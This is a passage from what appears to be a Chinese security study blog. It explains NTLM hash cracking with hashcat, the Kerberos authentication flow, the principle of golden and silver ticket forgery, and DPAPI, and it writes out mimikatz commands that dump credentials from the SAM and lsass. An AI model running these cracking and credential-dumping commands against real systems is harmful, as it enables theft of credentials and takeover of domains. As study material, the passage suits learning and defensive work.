哈希是由用户输入的密码本地计算得出的</u>，所以在这个步骤中，只要能提供正确的 NTLM  哈希即使不知道正确的密码也可通过认证!!</p><h3 id="Net-NTLM-Hash的破解"><a href="#Net-NTLM-Hash的破解" class="headerlink" title="Net NTLM Hash的破解"></a>Net NTLM Hash的破解</h3><p>需要用到hash密码破解的神器——hashcat，支持破解的协议非常的多</p><blockquote><p><a href="https://hashcat.net/wiki/doku.php">https://hashcat.net/wiki/doku.php</a>?</p><p>Hashcat的使用手册总结：<a href="https://xz.aliyun.com/t/4008">https://xz.aliyun.com/t/4008</a></p></blockquote><p>下面使常见的参数，想了解更多的参数可以hashcat –help查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a  指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。</span><br><span class="line">-m  指定要破解的hash类型，如果不指定类型，则默认是MD5</span><br><span class="line">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span><br><span class="line">--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span><br><span class="line">--show  显示已经破解的hash及该hash所对应的明文</span><br><span class="line">--increment  启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程</span><br><span class="line">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span><br><span class="line">--increment-max  密码最大长度,同上</span><br><span class="line">--outfile-format 指定破解结果的输出格式id,默认是3</span><br><span class="line">--username   忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到</span><br><span class="line">--remove     删除已被破解成功的hash</span><br><span class="line">-r       使用自定义破解规则</span><br></pre></td></tr></table></figure><p>NTLMv2的格式为：  </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 net-ntlm /tmp/password.list -o found.txt --force</span><br><span class="line">-m：hash-type即hash使用的协议，5600对应的是NetNTLMv2。详细支持的协议的参数可查表</span><br><span class="line">-o：输出文件 字典文件为/tmp/password.list</span><br><span class="line">--force：代表强制执行，测试系统不支持Intel OpenCL</span><br></pre></td></tr></table></figure><h2 id="域认证"><a href="#域认证" class="headerlink" title="域认证"></a>域认证</h2><p>在我看来，域认证：域内一台主机向另一台主机（server）发起请求，但是呢，我们身份的校验是在DC上，DC上面的ntds.dit数据库存储了域内所有主机的账号秘密hash，当我们身份在DC上通过校验时才能拿到访问server的方式~~。</p><h3 id="Kerberos简单介绍"><a href="#Kerberos简单介绍" class="headerlink" title="Kerberos简单介绍"></a>Kerberos简单介绍</h3><ul><li>Kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机&#x2F;服务器应用程序提供强大的认证服务。</li><li>该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。全部的操作都交由DC，DC允许你可以访问，你就不可以访问，不然的话，怎么都是不许的（霸道总裁</li><li>在以上情况下，Kerberos作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。</li></ul><p>域内认证即采用了Kerberos协议的认证机制，与前两者相比最大的区别是有个一个可信的第三方机构KDC的参与。</p><p>参与域认证的三个角色：</p><blockquote><ul><li><p>Client</p></li><li><p>Server</p></li><li><p>KDC(Key Distribution Center) &#x3D; DC(Domain Controller) &#x3D; AD（Account Database）+ AS（Authenication Service）+ TGS（Ticket Granting Service）</p><p><strong>从物理层面看，AD与AS，TGS，KDC均为域控制器(Domain Controller)。</strong></p></li></ul></blockquote><h3 id="Kerberos认证协议及域相关知识的基础概念"><a href="#Kerberos认证协议及域相关知识的基础概念" class="headerlink" title="Kerberos认证协议及域相关知识的基础概念"></a>Kerberos认证协议及域相关知识的基础概念</h3><ul><li>活动目录：</li></ul><p>活动目录AD：Active Diretory，是指域环境中提供目录服务的组件。目录用于存储有关<strong>网络对象</strong>（例如用户、组、计算机、共享资源、打印机和联系人等)的<strong>信息</strong>。能够快速、准确的从目录中找到其所需的信息的服务，为企业提供了网络环境集中式管理的机制。</p><p>活动目录主要的功能：</p><blockquote><ul><li>账号集中管理：所有的账户都存储在服务器中，可以方便快捷的<strong>执行命令和管理密码</strong>等。</li><li>软件集中管理：能够统一推送软件，安装网络打印机等服务器</li><li>环境集中管理：统一客户端桌面、IE等</li><li>增强安全性：统一部署杀软，统一执行病毒扫描任务、集中管理用户的计算机权限，统一指定密码策略。</li><li>更加的可靠更短的宕机时间</li></ul></blockquote><p>在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的计算机进行限制，例如：销售部门不能访问技术部门的服务器。这个中间就需要Kerberos认证协议来验证网络对象间的权限。</p><ul><li><p>票据(Ticket)：是网络对象<strong>互相访问</strong>的凭证。可以比喻为车票</p></li><li><p>TGT(Ticket Granting Ticket)：看英文名就知道 票据生成&#x2F;授予票据，用来生成Ticket的Ticket。就是生成网络对象之间访问的票据所需要的票据。如果将我们最终生成的网络对象之间访问的票据比喻为我们的火车票，那么TGT就是我们购买车票时验证我们身份的身份证~~另外，TGT在TGS上生成我们的最终Ticket！此时，我们的TGS就可以比喻为我们的售票机~，用来生成车票（ticket）。</p><p>由身份认证服务（AS）授予的票据(<strong>黄金票据</strong>)，用于身份认证，存储在内存，默认有效期为10小时。也就是这张在域内的身份证有效期只有十个小时</p></li><li><p>AD(Account Database)：存储域中所有用户的用户名和对应的NTLM Hash，可以理解为域中的SAM数据库，KDC可以从AD中提取域中所有用户的NTLM Hash，这是Kerberos协议能够成功实现的基础。</p></li><li><p>KDC(Key Distribution Center)：密钥分发中心，负责管理票据、认证票据、分发票据，里面包含两个服务：AS和TGS</p></li></ul><blockquote><p>KDC 提供两个核心服务:</p><ul><li>身份验证服务(AS - Authentication Server)：对Client进行身份验证并且向Client生成和发出TGT票证的服务，，也用来完成对Client的身份验证;前面将TGT比喻为身份证，那么AS对Client身份进行认证，自然就是兼饰“公安局”的角色，对Client(身份证)进行办法TGT（身份证）确认其身份~~~</li><li>票证授予&#x2F;生成服务(TGS - Ticket Granting Server)：接受经过身份验证的客户机并向其发出票证以访问其他资源。为Client生成允许对某个服务访问的ticket，就是Client从AS那里拿到TGT之后，来TGS这里再申请对某个特定服务或服务器访问的Ticket，只有获取到这个Ticket，Client才有权限去访问对应的服务，该服务提供的票据也称为 Ticket 或者叫<strong>白银票据</strong>。比喻为售票机，用来生成车票Ticket~~</li></ul></blockquote><h4 id="注意下面几点："><a href="#注意下面几点：" class="headerlink" title="注意下面几点："></a>注意下面几点：</h4><ul><li>Client 密钥 、TGS密钥 和 Service 密钥 均为对应用户的NTLM Hash，用对应用户的NTML hash加密DC和对应用户之间的交互信息~~后面会提到</li></ul><blockquote><ul><li>TGS密钥 &#x3D;&#x3D; KDC Hash &#x3D;&#x3D; krbtgt用户的NTLM Hash</li></ul><blockquote><p>krbtgt用户是域控独有用户，我们无法直接登录该用户，但该用户也有NTLM hash，kerberos认证时会用到</p></blockquote><ul><li>关于Service Hash</li></ul><blockquote><p>Service Hash其实是目标中一个用户名与hostname相同的用户的Hash 。如hostname为PC-WIN7的服务器，对应的Hash就是Username : PC-WIN7$的哈希。</p><p>service hash也是存储在域控之中~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141410834.png" alt="image-20220809172642251" style="zoom:50%;" /><p>再比如这个WEB$机器</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208232335629.png" alt="image-20220823233540388"></p></blockquote></blockquote><ul><li>Server 和 Service可以当作一个东西，就是Client想要访问的服务器或者服务</li><li>注意区分（Client&#x2F;TGS&#x2F;Server) Sessionkey和（Client&#x2F;TGS&#x2F;Service)密钥：</li></ul><blockquote><ul><li>（Client&#x2F;TGS&#x2F;Server) Sessionkey  ： 可以看作客户端与TGS服务和尝试登陆的Server之间会话时用来加密的<strong>密钥</strong>，</li><li>（Client&#x2F;TGS&#x2F;Service)密钥：(上面提到的三个实际为NTLM Hash的密钥)，是用来加密会话<strong>密钥的密钥</strong>，为了保证会话密钥的传输安全，这些加密方式均为对称加密。</li></ul><blockquote><p>参与认证的三个角色的 NTLM Hash  是三个密钥，这三个NTLM Hash的唯一作用是确保会话密钥 Sessionkey  的安全传输</p></blockquote><p><u>仔细体会上述两者的区别，一个是密钥，一个是加密密钥的密钥~~</u></p></blockquote><h3 id="Kerbreros认证流程"><a href="#Kerbreros认证流程" class="headerlink" title="Kerbreros认证流程"></a>Kerbreros认证流程</h3><p>Client向KDC发起服务请求，希望获取访问Server的权限。 KDC得到了这个消息，首先得判断Client是否是可信赖的， 也就是从AD数据库中寻找该用户是否可用来登录。这就是AS服务完成的工作，成功后，AS返回TGT给Client。</p><p>Client得到了TGT后，继续向KDC请求，希望获取访问Server的权限。KDC又得到了这个消息，这时候通过Client 消息中的TGT，判断出了Client拥有了这个权限，给了Client访问Server的权限Ticket。（TGS服务的任务）</p><p>Client得到Ticket后便可以使用这个Ticket成功访问Server。但是这个Ticket只能用来访问这个Server，如果要访问其他Server需要向KDC重新申请。</p><p>下图综述了Kerberos认证过程~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355638.png" alt="image-20220809164958412" style="zoom:50%;" /><p>接下来详细讲讲每一小步</p><h4 id="1-用户登录"><a href="#1-用户登录" class="headerlink" title="1. 用户登录"></a>1. 用户登录</h4><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355621.png" alt="image-20220809165025241" style="zoom: 33%;" /><ul><li>用户输入 [用户名] 和 [密码] 信息</li><li>在客户端，用户输入的 [密码] 通过计算生成NTLM哈希作做为 [Client密钥]</li></ul><h4 id="2-请求身份认证（与AS校验）"><a href="#2-请求身份认证（与AS校验）" class="headerlink" title="2. 请求身份认证（与AS校验）"></a>2. 请求身份认证（与AS校验）</h4><h5 id="2-1-客户端向AS-身份认证服务-发送认证请求"><a href="#2-1-客户端向AS-身份认证服务-发送认证请求" class="headerlink" title="2.1 客户端向AS(身份认证服务)发送认证请求"></a>2.1 客户端向AS(身份认证服务)发送认证请求</h5><p>客户端向AS发送认证请求，请求中带有明文的 [用户名] 信息</p><blockquote><p>此时并未发送[密码]或[密钥]信息</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355763.png" alt="image-20220809171208401" style="zoom: 33%;" /><h5 id="2-2-AS确认Client端登录者用户身份"><a href="#2-2-AS确认Client端登录者用户身份" class="headerlink" title="2.2 AS确认Client端登录者用户身份"></a>2.2 AS确认Client端登录者用户身份</h5><ol><li><p>AS收到用户认证请求之后，根据请求中的 [用户名] 信息，从AD数据库(account database)中查找该用户名是否存在。</p></li><li><p>如果 用户名 存在，则根据该用户名提取NTLM Hash做为AS生成的 [<strong>CLIENT 密钥</strong>]，如果第1步中用户提供的 密码 信息正确，并与该用户登录中的 [CLIENT密钥] 是相等的，则进行下一步。</p></li></ol><blockquote><p>注意哦，两次生成的[<strong>CLIENT 密钥</strong>]是不一样的，一个是AS通过调用域控上面存储的对应用户NTML Hash生成的密钥，一个是用户自己登录成功自动生成的[<strong>CLIENT 密钥</strong>]。只有两个密钥相同才认可其身份，这一步基本上就是和上面提到的Windows网络认证基本类似~~</p><p>并且要注意到，第一步只发送了用户名，并未发送密码，所以在AS这边仅仅只做了一个检验该用户身份是否存在的过程，并没有验证其密码是否正确，比对两个[<strong>CLIENT 密钥</strong>]是在哪里发生的呢？是在AS响应的包中，这样操作的意思就是：如果该用户的密码是正确的用户密码，那么他自然可以解开我包中所传递的 [Client&#x2F;TGS SessionKey]~~~这个过程也就是解密AS响应消息中Msg A的过程。Client只有用户密码对了，才能从Msg A中拿到 [Client&#x2F;TGS SessionKey]！！！我们只有拿到了 [Client&#x2F;TGS SessionKey]，才能保证后门和TGS会话的正常！！！！！！！！</p></blockquote><ol start="3"><li>AS为Client响应如下消息：</li></ol><ul><li><p>Msg A 使用 KDC生成的[CLIENT密钥] 加密的 [Client&#x2F;TGS SessionKey]，Client是可以那自己在第一步生成的[CLIENT密钥] 对之解密，拿出 [Client&#x2F;TGS SessionKey]~~~</p></li><li><p>Msg B 使用 [TGS密钥] 加密的TGT，客户端没有KDC NTLM Hash因此Client无法解密TGT。Client仅能持有TGT，拿着TGT再去找TGS要ticket，这是后话</p><p>TGT中包含如下信息：</p></li></ul><blockquote><ul><li>[Client&#x2F;TGS SessionKey]</li><li>Client ID</li><li>Ticket有效时间</li><li>CLient 地址</li></ul></blockquote><ol start="4"><li>Client收到AS的响应消息以后，利用自身的 CLIENT密钥 可以对Msg A进行解密，这样可以获取到 [Client&#x2F;TGS SessionKey] 。但由于Msg B是使用 TGS密钥 加密的，Client无法对其解密。</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355688.png" alt="image-20220809171642114" style="zoom: 33%;" /><blockquote><ul><li>AS响应的消息中有一条是属于Client的，但另外一条却属于TGS。</li><li>Client&#x2F;TGS SessionKey出现了两个Copy，一个给Client端，一个给TGS端。</li><li>认证过程中的加密除哈希外均采用的是对称加密算法</li></ul></blockquote><p>下面图片概述了AS返回的内容~~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355771.png" alt="image-20220809171311572" style="zoom: 50%;" /><h4 id="3-请求服务授权"><a href="#3-请求服务授权" class="headerlink" title="3. 请求服务授权"></a>3. 请求服务授权</h4><h5 id="3-1-客户端向TGS发送请求服务授权请求"><a href="#3-1-客户端向TGS发送请求服务授权请求" class="headerlink" title="3.1 客户端向TGS发送请求服务授权请求"></a>3.1 客户端向TGS发送请求服务授权请求</h5><p>下图概述了Client向TGS发送的内容：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355676.png" alt="image-20220809171738168" style="zoom:50%;" /><p>客户端发送的请求中包含如下两个消息：</p><ul><li>Msg C</li></ul><blockquote><ul><li>要请求的服务ID, 即[Service ID]</li><li>上一步2.2中由AS为Client提供的TGT</li></ul></blockquote><ul><li>Msg D</li></ul><blockquote><p>使用 [Client&#x2F;TGS SessionKey] 加密的Authenticator 1 {Client ID, Timestamp}</p></blockquote><h5 id="3-2-TGS为Client响应服务授权票据"><a href="#3-2-TGS为Client响应服务授权票据" class="headerlink" title="3.2 TGS为Client响应服务授权票据"></a>3.2 TGS为Client响应服务授权票据</h5><h6 id="TGS在响应之前会先解开请求内容："><a href="#TGS在响应之前会先解开请求内容：" class="headerlink" title="TGS在响应之前会先解开请求内容："></a>TGS在响应之前会先解开请求内容：</h6><p>KDC接收到TGT与其他内容后，会首先使用KDC 的NTLM Hash解密TGT，只有KDC可以解密TGT，从TGT中提取到 [Client&#x2F;TGS SessionKey] ，再使用 [Client&#x2F;TGS SessionKey] 解密Authenticator 1，获取到{Client ID, timestamp} 并与通过解密TGT获取到的{Client ID, 有效时间}进行对比，通过则继续响应。如下图</p><blockquote><ul><li>TGT中包含如下信息：</li></ul><blockquote><ul><li>[Client&#x2F;TGS SessionKey]</li><li>Client ID</li><li>Ticket有效时间</li><li>CLient 地址</li></ul></blockquote><p>所以TGT中携带了Client ID以及timestamp~~可以与Msg D中的Authenticator 1 {Client ID, Timestamp}进行对比</p><ul><li>实际上在这个对比Authenticator 1 {Client ID, Timestamp}是否有效的过程，这种认证是双向的，不仅仅是检验了客户端是否是“对的人”，也默认的对KGS端进行了验证~</li></ul><blockquote><p>因为只有KDC 的NTLM Hash对了，才能解密出[Client&#x2F;TGS SessionKey]，才能拿到Authenticator 1</p></blockquote></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355646.png" alt="image-20220809171856218" style="zoom: 33%;" /><h6 id="TGS为Client响应的消息包括："><a href="#TGS为Client响应的消息包括：" class="headerlink" title="TGS为Client响应的消息包括："></a>TGS为Client响应的消息包括：</h6><ul><li>Msg E 使用 [SERVICE密钥] (服务器的NTLM HASH) 加密的 CLIENT-TO-SERVER TICKET , 该Ticket中包含了如下信息:</li></ul><blockquote><ul><li>[Client&#x2F;Server SessionKey]</li><li>Client网络地址</li><li>Ticket有效时间</li><li>Client ID</li></ul></blockquote><p>注意，关于Msg E</p><blockquote><p> CLIENT-TO-SERVER TICKET是TGS授予的允许访问票据，但是client无法解密，只有server拿到手后，通过 [SERVICE密钥] 才能解密，以此来确认身份！！！！！</p></blockquote><ul><li>Msg F 使用[Client&#x2F;TGS SessionKey] 加密的 [Client&#x2F;Server SessionKey] 。</li></ul><blockquote><ul><li>Msg F使用了 [Client&#x2F;TGS SessionKey] 加密，因此，该消息对Client可见。Client对其解密以后可获取到 [Client&#x2F;Server SessionKey] 。</li><li>而Msg E使用了 [SERVICE密钥] 加密，该消息可视作是TGS给Service Server的消息，只不过由Client一起携带发送给Service Server</li></ul></blockquote><p>下图为TGS响应消息概览：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355594.png" alt="image-20220809171942456" style="zoom:50%;" /><h4 id="4-发送服务请求"><a href="#4-发送服务请求" class="headerlink" title="4. 发送服务请求"></a>4. 发送服务请求</h4><h5 id="4-1-Client向Service-Server发送服务请求"><a href="#4-1-Client向Service-Server发送服务请求" class="headerlink" title="4.1 Client向Service Server发送服务请求"></a>4.1 Client向Service Server发送服务请求</h5><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355685.png" alt="image-20220809172116925" style="zoom:50%;" /><p>发送的消息中包括：</p><ul><li><strong>Msg E</strong> 上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client携带的消息。</li></ul><blockquote><ul><li>Msg E 使用 [SERVICE密钥] (服务器的NTLM HASH) 加密的 CLIENT-TO-SERVER TICKET , 该Ticket中包含了如下信息:</li></ul><blockquote><ul><li>[Client&#x2F;Server SessionKey]</li><li>Client网络地址</li><li>Ticket有效时间</li><li>Client ID</li></ul></blockquote></blockquote><ul><li><strong>Msg G</strong> 由[Client&#x2F;Server SessionKey]加密的Authenticator 2，包含{Client ID, Timestamp}信息。</li></ul><blockquote><ol><li>[Client&#x2F;Server SessionKey] 并非直接传输，而是被包含在使用[Service密钥]加密的Msg E中。</li><li>既然 [Client&#x2F;Server SessionKey] 并不直接明文传输， Client需要向Service Server证明自己拥有正确的 [Client&#x2F;Server SessionKey] ，所以，Authenticator 2使用了 [Client&#x2F;Server SessionKey] 加密。</li></ol></blockquote><h5 id="4-2-SS响应Client"><a href="#4-2-SS响应Client" class="headerlink" title="4.2 SS响应Client"></a>4.2 SS响应Client</h5><ol><li>SS收到客户端的服务请求之后，先利用自身的 [SERVICE密钥] 对Msg E进行解密，提取出Client-To-Server Ticket, 在3.2步骤中，提到了该Ticket中包含了 [Client&#x2F;Server SessionKey] 以及Client ID信息。</li><li>SS使用 [Client&#x2F;Server SessionKey] 解密Msg G，提取Client ID信息，而后将该Client ID与Client-To-Server Ticket中的Client ID进行比对，如果匹配则说明Client拥有正确的 [Client&#x2F;Server SessionKey] 。</li><li>而后，SS向Client响应Msg H(包含使用 [Client&#x2F;Server SessionKey] 加密的Timestamp信息)。</li><li>Client收到SS的响应消息Msg H之后，再使用[Client&#x2F;Server SessionKey] 对其解密，提取Timestamp信息，然后确认该信息与Client发送的Authenticator 2中的Timestamp信息一致。</li></ol><p>如上信息可以看出来，该交互过程起到了Client与SS之间的“双向认证”作用。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355614.png" alt="image-20220809172331198" style="zoom:50%;" /><h3 id="kerberos参考"><a href="#kerberos参考" class="headerlink" title="kerberos参考"></a>kerberos参考</h3><blockquote><ul><li><a href="https://www.roguelynn.com/words/explain-like-im-5-kerberos/">解释像我5：Kerberos – roguelynn</a></li><li>【kerberos协议认证流程详解-哔哩哔哩】 <a href="https://b23.tv/zgPYbXB">https://b23.tv/zgPYbXB</a></li><li><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961976(v=technet.10)?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961976(v=technet.10)?redirectedfrom=MSDN</a></li><li><a href="https://www.cnblogs.com/huamingao/p/7267423.html">https://www.cnblogs.com/huamingao/p/7267423.html</a></li><li><a href="https://www.cnblogs.com/zpchcbd/p/11707302.html">Kerberos身份验证流程 - zpchcbd - 博客园 (cnblogs.com)</a>！！！！讲的好！！！</li><li><a href="https://juejin.cn/post/6945435504905027598">盘点认证协议 : 普及篇之Kerberos</a>（本文讲的也很不错~~极好）</li></ul></blockquote><h3 id="票据伪造的原理"><a href="#票据伪造的原理" class="headerlink" title="票据伪造的原理"></a>票据伪造的原理</h3><blockquote><p>注：如果难理解黄金票据TGT和白云票据Ticket的伪造原理。那么就请将3.1和4.1两次Client发起的请求做一个对比~~可能就懂了，注意对比两次请求中携带的信息。。注意到TGT和Ticket都是KDC颁发给client的（附带在KDC响应client的包中），但是client并不持有解密密钥，client仅能当“工具人”，仅能持有票据交给TGS和server去打开它~</p><ul><li>3.1Client请求TGS时，携带了：</li></ul><blockquote><ul><li>Msg C</li></ul><blockquote><ul><li>要请求的服务ID, 即[Service ID]</li><li>上一步2.2中由AS为Client提供的使用 [TGS密钥] 加密的TGT</li></ul><blockquote><p>TGT中包含如下信息：</p><blockquote><ul><li>[Client&#x2F;TGS SessionKey]</li><li>Client ID</li><li>Ticket有效时间</li><li>CLient 地址</li></ul></blockquote></blockquote></blockquote><ul><li>Msg D</li></ul><blockquote><p>使用 [Client&#x2F;TGS SessionKey] 加密的Authenticator 1 {Client ID, Timestamp}</p></blockquote></blockquote><ul><li>4.1Client请求server时，携带了：</li></ul><blockquote><ul><li><strong>Msg E</strong> 上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client携带的消息。</li></ul><blockquote><ul><li>Msg E 使用 [SERVICE密钥] (服务器的NTLM HASH) 加密的 CLIENT-TO-SERVER TICKET , 该Ticket中包含了如下信息:</li></ul><blockquote><ul><li>[Client&#x2F;Server SessionKey]</li><li>Client网络地址</li><li>Ticket有效时间</li><li>Client ID</li></ul></blockquote></blockquote><ul><li><strong>Msg G</strong> 由[Client&#x2F;Server SessionKey]加密的Authenticator 2，包含{Client ID, Timestamp}信息。</li></ul></blockquote></blockquote><ul><li>2.2 AS确认Client端登录者用户身份</li></ul><p>KDC返回的Msg B：使用  [TGS密钥] 加密的TGT，当<strong>我们获取到krbtgt用户的NTLM哈希后</strong>，便可主动使用krbtgt用户的NTLM哈希做为TGS密钥来生成TGT发送给KDC，这样KDC如果通过解密伪造TGT获取到伪造的 [CLIENT&#x2F;TGS SESSIONKEY] 可以成功解密 Authenticator 1 并完成与TGT中的数据进行比对，便成功骗过了KDC，也就是成功伪造了黄金票据（TGT便是黄金票据）</p><blockquote><p>简而言之便是：我们通过伪造的 [TGS密钥] 生成TGT，发送给KDC，来骗取其响应中的和TGS通信的 [CLIENT&#x2F;TGS SESSIONKEY]，并凭借此sessionkey在3.1中伪造成一个正常用户继续向KGS发起请求~~~</p><p>理解的关键在于：在AS返回Client的消息中，有一个Msg B 使用 [TGS密钥] 加密的TGT，Msg B虽然是Client接受，但无法解密，这个东西是他要拿着去带给TGS证明自己身份的~也就是说，如果我们在3.1向TGS请求过程中，携带的Msg B 可以用[TGS密钥] 解密，那就证明了我们的身份（证明我们是正常用户）。</p><p>但是，不凑巧的是，我们破获了 [TGS密钥]，这就是黄金票据的原理~</p></blockquote><ul><li>4.1 Client向SS(Service Server)发送服务请求</li></ul><p>客户端向服务器发送的为使用 SERVICE密钥(服务器的NTLMHASH) 加密的 CLIENT-TO-SERVER TICKET ，在Ticket中包含用来供服务器解密Authenticator 2的 CLIENT&#x2F;SERVER SESSIONKEY 。<strong>如果获取到了Service Server的NTLM</strong><br><strong>Hash</strong>，便可伪造Ticket，和Authenticator 2 ，Service Server在接收到Ticket和Authenticator 2后可以使用自己的NTLM Hash正常解密完成比对，也就是成功伪造了白银票据（访问服务的Ticket即为白银票据）</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><ul><li><a href="https://xz.aliyun.com/t/1943">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></li><li><a href="https://payloads.online/archivers/2018-11-30/1/">彻底理解Windows认证 - 议题解读 « 倾旋的博客</a></li><li><a href="https://link.zhihu.com/?target=http://wikipedia.moesalih.com/NTLM">NT LAN Manager</a></li><li><a href="https://link.zhihu.com/?target=http://www.voidcn.com/article/p-voxshmho-sn.html">NTLM 协议</a></li><li><a href="https://link.zhihu.com/?target=https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></li></ul></blockquote><h1 id="Windows密码凭证获取"><a href="#Windows密码凭证获取" class="headerlink" title="Windows密码凭证获取"></a>Windows密码凭证获取</h1><p>Windows的密码一般存在syskey加密过后的系统文件中（SAM文件）或者是注册表中</p><h2 id="Token窃取与利用"><a href="#Token窃取与利用" class="headerlink" title="Token窃取与利用"></a>Token窃取与利用</h2><p>Windows有两种类型的token：</p><ul><li>Delegation Token（授权令牌）:用来交互会话（用户直接登录，远程桌面登录）</li><li>Impresonation Token（模拟令牌）：用于非交互登录（利用net user访问共享文件夹）</li></ul><p>两种token只在系统注销重启后清除</p><p>具有Delegation Token的用户在注销后，该token将变成impersonation token，依旧有效。</p><h2 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h2><blockquote><p>通过Dpapi获取Windows身份凭证<a href="https://xz.aliyun.com/t/6508">https://xz.aliyun.com/t/6508</a></p><p>Mimikatz之DPAPI学习与实践<a href="https://zhuanlan.zhihu.com/p/43888078">https://zhuanlan.zhihu.com/p/43888078</a></p></blockquote><h3 id="Dpapi简述"><a href="#Dpapi简述" class="headerlink" title="Dpapi简述"></a>Dpapi简述</h3><p>从Windows 2000开始，Microsoft随操作系统一起提供了一种特殊的数据保护接口，称为Data Protection Application Programming Interface（DPAPI）。其分别提供了加密函数CryptProtectData 与解密函数 CryptUnprotectData 以用作敏感信息的加密解密。</p><p>其用作范围包括且不限于：</p><ul><li>IE、Chrome的登录表单自动完成</li><li>Powershell加密函数</li><li>Outlook, Windows Mail, Windows Mail, 等邮箱客户端的用户密码。</li><li>FTP管理账户密码</li><li>共享资源文件夹的访问密码</li><li>无线网络帐户密钥和密码</li><li>远程桌面身份凭证</li><li>EFS</li><li>EAP&#x2F;TLS 和 802.1x的身份凭证</li><li>Credential Manager中的数据</li><li>以及各种调用了CryptProtectData函数加密数据的第三方应用，如Skype, Windows Rights Management Services, Windows Media, MSN messenger, Google Talk等。</li><li>etc</li></ul><p>由于功能需求，Dpapi采用的加密类型为对称加密，所以只要找到了密钥(Master Key )，就能解开物理存储的加密信息了。</p><h3 id="Master-Key-Files"><a href="#Master-Key-Files" class="headerlink" title="Master Key Files"></a>Master Key Files</h3><p>存放密钥的文件则被称之为<code>Master Key Files</code>，其路径一般为<code>%APPDATA%/Microsoft/Protect/%SID%</code>。而这个文件中的密钥实际上是<strong>随机64位字节码经过用户密码等信息的加密后的密文</strong>，所以只需要有用户的明文密码&#x2F;Ntlm&#x2F;Sha1就可以还原了。</p><h2 id="系统用户凭证获取"><a href="#系统用户凭证获取" class="headerlink" title="系统用户凭证获取"></a>系统用户凭证获取</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><ul><li><strong>win7和win10mimikatz的使用会存在区别</strong></li><li>要有管理员权限 普通用户无法获取密码</li><li>mimikatz原理就是从系统lsass.exe进程中获取明文密码或者hash，得要用户登录才能从中获取</li></ul><h4 id="mimikatz-for-Win10下载："><a href="#mimikatz-for-Win10下载：" class="headerlink" title="mimikatz for Win10下载："></a>mimikatz for Win10下载：</h4><blockquote><p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p></blockquote><h4 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看mimikatz可以用哪些命令，随便敲两个或者一个：</span><br><span class="line">::查看高级命令模块</span><br><span class="line">：查看基本命令</span><br><span class="line">#选定某个模块后，比如privilege之后，可以继续输入两个::查看具体用法如privilege::</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="本地非交互式凭证获取："><a href="#本地非交互式凭证获取：" class="headerlink" title="本地非交互式凭证获取："></a>本地非交互式凭证获取：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win10：</span><br><span class="line">mimikatz.exe &quot;log res.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class="line">win7:</span><br><span class="line">mimikatz.exe &quot;log logon.txt&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><h4 id="交互式："><a href="#交互式：" class="headerlink" title="交互式："></a>交互式：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.0版本</span><br><span class="line">privilege::debug    </span><br><span class="line">//提升权限,提升到调试权限，才能获取到lsass.exe进程中保存的密码。另外需要有管理员权限才能提升至debug</span><br><span class="line">sekurlsa::logonpasswords    </span><br><span class="line">//抓取密码</span><br><span class="line">1.X版本</span><br><span 